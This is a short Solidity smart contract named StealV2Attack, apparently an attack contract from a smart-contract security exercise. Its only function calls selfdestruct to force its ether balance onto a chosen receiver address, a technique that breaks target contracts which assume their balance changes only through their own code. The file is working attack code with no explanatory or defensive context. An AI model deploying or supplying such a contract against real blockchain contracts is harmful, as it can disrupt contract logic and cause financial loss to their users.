// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract StealV2Attack {
    function attack(address _receiver) public {
        selfdestruct(payable(_receiver));
    }
}
